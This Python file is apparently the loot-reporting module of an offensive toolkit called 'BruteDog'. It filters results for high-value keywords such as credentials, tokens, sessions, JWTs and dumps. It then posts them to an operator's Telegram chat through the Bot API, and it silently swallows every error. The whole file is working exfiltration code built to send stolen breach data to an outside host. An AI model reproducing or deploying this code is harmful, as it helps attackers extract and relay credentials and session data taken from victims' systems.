#!/usr/bin/env python3
"""
TELEMETRY_BROADCASTER.PY v8.8 — Centralized Zero-Noise Offensive Telemetry & Proof-of-Work Dispatcher (Elite Red Team Adversarial Edition)
Features:
- Zero-noise filtering: Restricts broadcasts strictly to verified high-value breach loot and critical exploit pivots.
- Asynchronous and synchronous telemetry and loot broadcasting to Telegram.
- Clean HTML message templating with structured dictionary field formatting.
- Resilient non-blocking execution across multi-threaded and async module boundaries.
"""
import os
import asyncio
import httpx
from typing import Union, Dict, Any

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", os.getenv("BRUTEDOG_TG_TOKEN", ""))
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", os.getenv("BRUTEDOG_TG_CHAT", ""))

# Keywords required to pass the zero-noise filter
HIGH_VALUE_KEYWORDS = [
    "critical", "bypass", "success", "loot", "token", "session", 
    "admin", "credential", "compromised", "race", "pivot", "jwt", "dump"
]

async def broadcast_loot(vector: str, details: Union[Dict[str, Any], str]):
    """
    Centralized asynchronous dispatcher for BruteDog offensive modules.
    Enforces a strict zero-noise filter before pushing verified loot to Telegram.
    """
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return

    # Zero-Noise Filtering Gate
    check_str = f"{vector} {str(details)}".lower()
    if not any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
        return  # Suppress low-priority telemetry chatter completely

    api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

    if isinstance(details, dict):
        lines = [f"• <b>{str(k)}</b>: <code>{str(v)}</code>" for k, v in details.items()]
        details_str = "\n".join(lines)
    else:
        details_str = f"<code>{str(details)}</code>"

    message = (
        f"🚨 <b>BRUTEDOG V8.8 — VERIFIED COGNITIVE LOOT</b> 🚨\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 <b>Vector:</b> <code>{vector.upper()}</code>\n\n"
        f"{details_str}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }

    try:
        async with httpx.AsyncClient(timeout=6.0) as client:
            await client.post(api_url, json=payload)
    except Exception:
        pass

def broadcast_loot_sync(vector: str, details: Union[Dict[str, Any], str]):
    """Synchronous wrapper for modules running in threading or non-async contexts."""
    try:
        loop = asyncio.get_running_loop()
        if loop.is_running():
            loop.create_task(broadcast_loot(vector, details))
        else:
            asyncio.run(broadcast_loot(vector, details))
    except RuntimeError:
        try:
            asyncio.run(broadcast_loot(vector, details))
        except Exception:
            pass

# Alias bindings for complete backward compatibility across framework modules
send_telemetry_alert = broadcast_loot
send_telemetry_alert_sync = broadcast_loot_sync
